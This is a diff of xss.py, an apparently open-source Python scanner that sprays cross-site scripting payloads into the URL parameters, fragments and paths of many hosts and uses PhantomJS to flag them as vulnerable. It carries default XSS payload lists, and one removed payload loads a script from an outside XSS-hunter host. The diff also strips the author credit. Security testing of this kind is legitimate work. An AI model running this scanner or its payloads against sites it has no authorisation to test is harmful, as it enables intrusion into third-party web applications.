@@ -2,7 +2,6 @@
 
 # I don't believe in license.
 # You can do whatever you want with this program.
-# author:  https://github.com/gwen001
 
 import os
 import sys
@@ -22,28 +21,25 @@ from colored import fg, bg, attr
 
 
 def banner():
-    print("""
+	print("""
                         __  _____ ___       _ __  _   _
                         \ \/ / __/ __|     | '_ \| | | |
                          >  <\__ \__ \  _  | |_) | |_| |
                         /_/\_\___/___/ (_) | .__/ \__, |
                                            |_|    |___/
-
                                 by @gwendallecoguic
-
 """)
-    pass
+	pass
 
-
-def rebuiltQuery(t_params):
+def rebuiltQuery( t_params ):
     query = ''
-    for pname, t_values in t_params.items():
+    for pname,t_values in t_params.items():
         for k in range(len(t_values)):
-            query = query + pname + '=' + t_values[k] + '&'
+            query = query + pname+'='+t_values[k] + '&'
     return query.strip('&')
 
 
-def _parse_qs(query):
+def _parse_qs( query ):
     t_params = {}
     tmptab = query.split('&')
 
@@ -53,113 +49,115 @@ def _parse_qs(query):
         if not pname in t_params:
             t_params[pname] = []
         pvalue = '' if len(t_param) < 2 else t_param[1]
-        t_params[pname].append(pvalue)
+        t_params[pname].append( pvalue )
 
     return t_params
 
 
-def testParams(t_urlparse, payload):
+def testParams( t_urlparse, payload ):
     # t_params = urllib.parse.parse_qs( t_urlparse.query )
-    t_params = _parse_qs(t_urlparse.query)
+    t_params = _parse_qs( t_urlparse.query )
 
-    for pname, t_values in t_params.items():
+    for pname,t_values in t_params.items():
         for k in range(len(t_values)):
             pvalue = t_values[k]
             t_params2 = copy.deepcopy(t_params)
             if pvalue == '':
                 pvalue = 666
             new_value = str(pvalue) + payload
-            t_params2[pname][k] = urllib.parse.quote(new_value)
-            new_query = rebuiltQuery(t_params2)
+            t_params2[pname][k] = urllib.parse.quote( new_value )
+            new_query = rebuiltQuery( t_params2 )
             t_urlparse = t_urlparse._replace(query=new_query)
             url = urllib.parse.urlunparse(t_urlparse)
-            doTest(url)
+            doTest( url )
             # convert get params to post
             t_urlparse = t_urlparse._replace(query='')
             url = urllib.parse.urlunparse(t_urlparse)
-            doTest(url, 'POST', new_query)
+            doTest( url, 'POST', new_query )
 
 
-def testFragment(t_urlparse, payload):
+def testFragment( t_urlparse, payload ):
     new_value = t_urlparse.fragment + urllib.parse.quote(payload)
     t_urlparse = t_urlparse._replace(fragment=new_value)
     url = urllib.parse.urlunparse(t_urlparse)
-    doTest(url)
+    doTest( url )
 
 
-def testPath(t_urlparse, payload):
+def testPath( t_urlparse, payload ):
     path = ''
     t_path = ['/'] + t_urlparse.path.split('/')
 
     for dir in t_path:
         if len(dir):
             path = path + '/' + dir
-            path = path.replace('//', '/')
+            path = path.replace('//','/')
             # new_value = os.path.dirname(t_urlparse.path) + '/' + urllib.parse.quote(payload)
             new_value = path + '/' + urllib.parse.quote(payload)
-            new_value = new_value.replace('//', '/')
+            new_value = new_value.replace('//','/')
             t_urlparse = t_urlparse._replace(path=new_value)
             url = urllib.parse.urlunparse(t_urlparse)
-            doTest(url)
+            doTest( url )
 
 
-def testPayload(url, payload):
-    t_urlparse = urllib.parse.urlparse(url)
+def testPayload( url, payload ):
+    t_urlparse = urllib.parse.urlparse( url )
 
     if len(t_urlparse.query):
-        testParams(t_urlparse, payload)
+        testParams( t_urlparse, payload )
 
     if len(t_urlparse.fragment):
-        testFragment(t_urlparse, payload)
+        testFragment( t_urlparse, payload )
 
-    testPath(t_urlparse, payload)
+    testPath( t_urlparse, payload )
 
 
-def testURL(url):
-    time.sleep(0.01)
+def testURL( url ):
+    time.sleep( 0.01 )
 
     if _verbose <= 1:
-        sys.stdout.write('progress: %d/%d\r' % (t_multiproc['n_current'], t_multiproc['n_total']))
+        sys.stdout.write( 'progress: %d/%d\r' %  (t_multiproc['n_current'],t_multiproc['n_total']) )
         t_multiproc['n_current'] = t_multiproc['n_current'] + 1
 
-    pool = Pool(10)
-    pool.map(partial(testPayload, url), t_payloads)
+    pool = Pool( 10 )
+    pool.map( partial(testPayload,url), t_payloads )
     pool.close()
     pool.join()
 
 
-def doTest(url, method='GET', post_params=''):
-    t_realdotest.append([url, method, post_params])
+def doTest( url, method='GET', post_params='' ):
+
+    t_realdotest.append( [url,method,post_params] )
     return
 
 
 # console.log( 'Usage: phantomjs xss.js <method> <url> [<post_params>] [<cookies> <domain>]');
-def realDoTest(t_params):
+def realDoTest( t_params ):
+
     url = t_params[0]
     method = t_params[1]
     post_params = t_params[2]
 
     if _verbose <= 1:
-        sys.stdout.write('progress: %d/%d\r' % (t_multiproc['n_current'], t_multiproc['n_total']))
+        sys.stdout.write( 'progress: %d/%d\r' %  (t_multiproc['n_current'],t_multiproc['n_total']) )
         t_multiproc['n_current'] = t_multiproc['n_current'] + 1
 
-    t_urlparse = urllib.parse.urlparse(url)
-    t_params = [method, url, post_params, _cookies, t_urlparse.netloc]
+    t_urlparse = urllib.parse.urlparse( url )
+    t_params = [ method, url, post_params, _cookies, t_urlparse.netloc ]
 
     cmd = _phantom_cmd
     for param in t_params:
-        cmd = cmd + ' ' + '"' + base64.b64encode(param.encode()).decode() + '"'
+        cmd = cmd + ' ' + '"'+base64.b64encode(param.encode()).decode()+'"'
     if _verbose >= 3 and _verbose < 4:
         print(cmd)
 
     cmd_output = ''
     try:
-        cmd_output = subprocess.check_output(cmd, shell=True).decode('utf-8')
+        cmd_output = subprocess.check_output( cmd, shell=True ).decode('utf-8')
         if _verbose >= 3 and _verbose < 4:
-            print(cmd_output)
+            print( cmd_output )
     except Exception as e:
         if _verbose >= 3 and _verbose < 4:
-            sys.stdout.write("%s[-] error occurred: %s%s\n" % (fg('red'), e, attr(0)))
+            sys.stdout.write( "%s[-] error occurred: %s%s\n" % (fg('red'),e,attr(0)) )
         # pass
 
     if 'called' in cmd_output:
@@ -167,31 +165,30 @@ def realDoTest(t_params):
     else:
         vuln = '-'
 
-    output = "%s\t\tP=%s\t\tV=%s\n" % (url, post_params, vuln)
+    output = "%s\t\tP=%s\t\tV=%s\n" % (url,post_params,vuln)
 
-    fp = open(t_multiproc['f_output'], 'a+')
-    fp.write(output)
+    fp = open( t_multiproc['f_output'], 'a+' )
+    fp.write( output )
     fp.close()
 
     if vuln == 'VULNERABLE' or (_verbose >= 2 and _verbose < 4):
         if vuln == 'VULNERABLE':
-            sys.stdout.write('%s%s%s' % (fg('light_red'), output, attr(0)))
+            sys.stdout.write( '%s%s%s' % (fg('light_red'),output,attr(0)) )
         else:
-            sys.stdout.write(output)
+            sys.stdout.write( output )
 
 
 parser = argparse.ArgumentParser()
-parser.add_argument("-a", "--path", help="set paths list")
-parser.add_argument("-c", "--cookies",
-                    help="cookies separated by semi-colon, example: cookie1=value1;cookie2=value2...")
-parser.add_argument("-n", "--phantom", help="phantomjs path")
-parser.add_argument("-o", "--hosts", help="set host list (required or -u)")
-parser.add_argument("-p", "--payloads", help="set payloads list")
-parser.add_argument("-s", "--scheme", help="scheme to use, default=http,https")
-parser.add_argument("-t", "--threads", help="threads, default 10")
-parser.add_argument("-u", "--urls", help="set url list (required or -o)")
-parser.add_argument("-v", "--verbose",
-                    help="display output, 0=nothing, 1=only vulnerable, 2=all requests, 3=full debug, 4=only vulnerable,no extra text like banner, default: 1")
+parser.add_argument( "-a","--path",help="set paths list" )
+parser.add_argument( "-c","--cookies",help="cookies separated by semi-colon, example: cookie1=value1;cookie2=value2..." )
+parser.add_argument( "-n","--phantom",help="phantomjs path" )
+parser.add_argument( "-o","--hosts",help="set host list (required or -u)" )
+parser.add_argument( "-O","--output",help="output file location " )
+parser.add_argument( "-p","--payloads",help="set payloads list" )
+parser.add_argument( "-s","--scheme",help="scheme to use, default=http,https" )
+parser.add_argument( "-t","--threads",help="threads, default 10" )
+parser.add_argument( "-u","--urls",help="set url list (required or -o)" )
+parser.add_argument( "-v","--verbose",help="display output, 0=nothing, 1=only vulnerable, 2=all requests, 3=full debug, 4=only vulnerable,no extra text like banner, default: 1" )
 parser.parse_args()
 args = parser.parse_args()
 
@@ -206,19 +203,21 @@ if _verbose < 4:
 if args.phantom:
     _phantom = args.phantom
 else:
-    _phantom = '/usr/local/bin/phantomjs'
+    _phantom = '/usr/bin/phantomjs'
+    # _phantom = '/usr/local/bin/phantomjs'
     # _phantom = '/usr/local/bin/node'
 if not os.path.isfile(_phantom):
-    parser.error('phantomjs not found!')
+    parser.error( 'phantomjs not found!' )
 # _phantom_cmd = _phantom + ' ' + os.path.dirname(os.path.realpath(__file__)) + '/phantom-xss.js'
-_phantom_cmd = _phantom + ' --load-images=false ' + os.path.dirname(os.path.realpath(__file__)) + '/phantom-xss.js'
+# _phantom_cmd = _phantom + ' --load-images=false ' + os.path.dirname(os.path.realpath(__file__)) + '/phantom-xss.js'
+_phantom_cmd =  f"{_phantom} -platform offscreen --load-images=false {os.path.dirname(os.path.realpath(__file__))}/phantom-xss.js   "
 # _phantom_cmd = _phantom + ' ' + os.path.dirname(os.path.realpath(__file__)) + '/puppeteer-xss.js'
 # print( _phantom_cmd )
 
 if args.scheme:
     t_scheme = args.scheme.split(',')
 else:
-    t_scheme = ['http', 'https']
+    t_scheme = ['http','https']
 
 if args.cookies:
     _cookies = args.cookies
@@ -228,53 +227,53 @@ else:
 t_hosts = []
 if args.hosts:
     if os.path.isfile(args.hosts):
-        fp = open(args.hosts, 'r')
+        fp = open( args.hosts, 'r' )
         t_hosts = fp.read().strip().split("\n")
         fp.close()
     else:
-        t_hosts.append(args.hosts)
+        t_hosts.append( args.hosts )
 n_hosts = len(t_hosts)
 if _verbose < 4:
-    sys.stdout.write('%s[+] %d hosts found: %s%s\n' % (fg('green'), n_hosts, args.hosts, attr(0)))
+    sys.stdout.write( '%s[+] %d hosts found: %s%s\n' % (fg('green'),n_hosts,args.hosts,attr(0)) )
 
 t_urls = []
 if args.urls:
     if os.path.isfile(args.urls):
-        fp = open(args.urls, 'r')
+        fp = open( args.urls, 'r' )
         t_urls = fp.read().strip().split("\n")
         fp.close()
     else:
-        t_urls.append(args.urls)
+        t_urls.append( args.urls )
 n_urls = len(t_urls)
 if _verbose < 4:
-    sys.stdout.write('%s[+] %d urls found: %s%s\n' % (fg('green'), n_urls, args.urls, attr(0)))
+    sys.stdout.write( '%s[+] %d urls found: %s%s\n' % (fg('green'),n_urls,args.urls,attr(0)) )
 
 if n_hosts == 0 and n_urls == 0:
-    parser.error('hosts/urls list missing')
+    parser.error( 'hosts/urls list missing' )
 
-t_path = ['']
+t_path = [ '' ]
 if args.path:
     if os.path.isfile(args.path):
-        fp = open(args.path, 'r')
+        fp = open( args.path, 'r' )
         t_path = fp.read().strip().split("\n")
         fp.close()
     else:
-        t_path.append(args.path)
+        t_path.append( args.path )
 n_path = len(t_path)
 if _verbose < 4:
-    sys.stdout.write('%s[+] %d path found: %s%s\n' % (fg('green'), n_path, args.path, attr(0)))
+    sys.stdout.write( '%s[+] %d path found: %s%s\n' % (fg('green'),n_path,args.path,attr(0)) )
 
 if args.payloads:
     t_payloads = []
     if os.path.isfile(args.payloads):
-        fp = open(args.payloads, 'r')
+        fp = open( args.payloads, 'r' )
         t_payloads = fp.read().strip().split("\n")
         fp.close()
     else:
-        t_payloads.append(args.payloads)
+        t_payloads.append( args.payloads )
     n_payloads = len(t_payloads)
     if _verbose < 4:
-        sys.stdout.write('%s[+] %d payloads found: %s%s\n' % (fg('green'), n_payloads, args.payloads, attr(0)))
+        sys.stdout.write( '%s[+] %d payloads found: %s%s\n' % (fg('green'),n_payloads,args.payloads,attr(0)) )
 else:
     n_payloads = 0
 
@@ -286,40 +285,36 @@ else:
 t_totest = []
 t_vulnerable = []
 u_max_length = 0
-d_output = os.getcwd() + '/xss'
-f_output = d_output + '/' + 'output'
-if not os.path.isdir(d_output):
-    try:
-        os.makedirs(d_output)
-    except Exception as e:
-        sys.stdout.write("%s[-] error occurred: %s%s\n" % (fg('red'), e, attr(0)))
-        exit()
+# d_output =  os.getcwd()+'/xss'
+f_output = args.output
+# if not os.path.isdir(d_output):
+#     try:
+#         os.makedirs( d_output )
+#     except Exception as e:
+#         sys.stdout.write( "%s[-] error occurred: %s%s\n" % (fg('red'),e,attr(0)) )
+#         exit()
 
 # source: https://twitter.com/brutelogic/status/1138805808328839170
 if not n_payloads:
     t_payloads = [
-        '\'"--><sVg onload=prompt(1)>',
-        '\'"--><a autofocus onfocus=prompt(1) href=?>.',
-        '\'"--></sCrIpt><sCRIpt>prompt(1)</SCript>',
-        '\'"--><svG><scRIpt href=data:,prompt(1) />',
-        '"-prompt(1)-"',
+        '\'"--><svg onload=prompt(1)>',
+        '"autofocus onfocus=prompt(1)//',
+        '\'"--></script><script>prompt(1)</script>',
+        "'-prompt(1)-'",
         "\\'-prompt(1)//",
-        "'\")];*/prompt(1);/*",
-        '" onload=prompt(1)>',
-        '\'"--><SCripT src="//glc.xss.ht">',
-        '\'"--><sCRipt src=javascript:[1].find(prompt)>',
-        "'\"--><x v-on=_c.constructor('prompt(1)')()>",
+        'javascript:prompt(1)',
     ]
 n_payloads = len(t_payloads)
 
 if _verbose < 4:
-    sys.stdout.write('%s[+] options are -> threads:%d, payloads:%d%s\n' % (fg('green'), _threads, n_payloads, attr(0)))
+    sys.stdout.write( '%s[+] options are -> threads:%d, payloads:%d%s\n' % (fg('green'),_threads,n_payloads,attr(0)) )
+
 
 for scheme in t_scheme:
     for host in t_hosts:
         for path in t_path:
             u = scheme + '://' + host.strip() + path
-            t_totest.append(u)
+            t_totest.append( u )
             l = len(u)
             if l > u_max_length:
                 u_max_length = l
@@ -327,7 +322,7 @@ for scheme in t_scheme:
 for url in t_urls:
     for path in t_path:
         u = url.strip() + path
-        t_totest.append(u)
+        t_totest.append( u )
         l = len(u)
         if l > u_max_length:
             u_max_length = l
@@ -343,11 +338,10 @@ t_exceptions = {}
 t_multiproc = {
     'n_current': 0,
     'n_total': n_totest,
-    'u_max_length': u_max_length + 5,
-    'd_output': d_output,
+    'u_max_length': u_max_length+5,
+    # 'd_output': d_output,
     'f_output': f_output,
 }
-
 
 # testURL( args.urls)
 # exit()
@@ -355,56 +349,56 @@ t_multiproc = {
 def doWork():
     while True:
         url = q.get()
-        testURL(url)
+        testURL( url )
         q.task_done()
 
-
-q = Queue(_threads * 2)
+q = Queue( _threads*2 )
 
 for i in range(_threads):
-    t = Thread(target=doWork)
+    t = Thread( target=doWork )
     t.daemon = True
     t.start()
 
 try:
     for url in t_totest:
-        q.put(url)
+        q.put( url )
     q.join()
 except KeyboardInterrupt:
     sys.exit(1)
 
+
 if _verbose < 4:
-    sys.stdout.write('%s[+] %d urls payloaded to test.%s\n' % (fg('green'), len(t_realdotest), attr(0)))
-    sys.stdout.write('[+] testing...\n')
+    sys.stdout.write( '%s[+] %d urls payloaded to test.%s\n' % (fg('green'),len(t_realdotest),attr(0)) )
+    sys.stdout.write( '[+] testing...\n' )
+
 
 t_exceptions = {}
 t_vulnerable = {}
 t_multiproc = {
     'n_current': 0,
     'n_total': len(t_realdotest),
-    'u_max_length': u_max_length + 5,
-    'd_output': d_output,
+    'u_max_length': u_max_length+5,
+    # 'd_output': d_output,
     'f_output': f_output,
 }
-
 
 def realDoWork():
     while True:
         params = q.get()
-        realDoTest(params)
+        realDoTest( params )
         q.task_done()
 
-
-q = Queue(_threads * 2)
+q = Queue( _threads*2 )
 
 for i in range(_threads):
-    t = Thread(target=realDoWork)
+    t = Thread( target=realDoWork )
     t.daemon = True
     t.start()
 
 try:
     for url in t_realdotest:
-        q.put(url)
+        q.put( url )
     q.join()
 except KeyboardInterrupt:
     sys.exit(1)
+
